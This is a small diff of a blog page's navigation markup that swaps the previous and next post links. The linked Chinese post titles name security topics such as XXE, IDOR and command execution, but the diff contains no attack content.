-            <a href="/2018/12/20/第三篇翻译：XXE漏洞/" title="上一篇: 第三篇翻译：XXE漏洞">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/12/19/第一篇翻译：Change-Anyone’s-profile-picture-Exploiting-IDOR/" title="下一篇: 第一篇翻译：越权漏洞">
+            <a href="/2019/02/14/第十三篇：命令执行/" title="下一篇: 第十三篇：命令执行">
                 <i class="fa fa-angle-right"></i>
             </a>
         
